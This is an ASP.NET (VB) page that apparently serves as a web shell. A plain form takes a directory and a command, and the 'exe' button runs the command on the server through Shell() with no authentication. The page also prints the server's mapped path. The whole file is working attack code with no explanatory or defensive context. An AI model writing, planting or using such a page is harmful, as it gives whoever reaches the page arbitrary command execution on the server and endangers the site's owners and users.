<%@ Page Language="VB" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">

	Protected Sub Button1_Click(ByVal sender As Object, ByVal e As System.EventArgs)
		ChDir(Me.TEXTBOX2.Text)
		Shell(Me.TextBox1.Text)
	End Sub

	Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs)
		Response.Write(Me.TEXTBOX2.Text + "<br>")
		Response.Write(Me.TextBox1.Text)
		Response.Flush()
		Me.TEXTBOX2.Text = Server.MapPath("")
	End Sub
</script>

<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
    <title>Untitled Page</title>
</head>
<body>
    <form id="form1" runat="server">
    <div>
	    <ASP:TEXTBOX ID="TEXTBOX2" RUNAT="server" WIDTH="703px"></ASP:TEXTBOX>
	    <ASP:TEXTBOX ID="TextBox1" RUNAT="server" WIDTH="703px"></ASP:TEXTBOX>
	    <ASP:BUTTON ID="Button1" RUNAT="server" ONCLICK="Button1_Click"
		    TEXT="exe" /></div>
    </form>
</body>
</html>
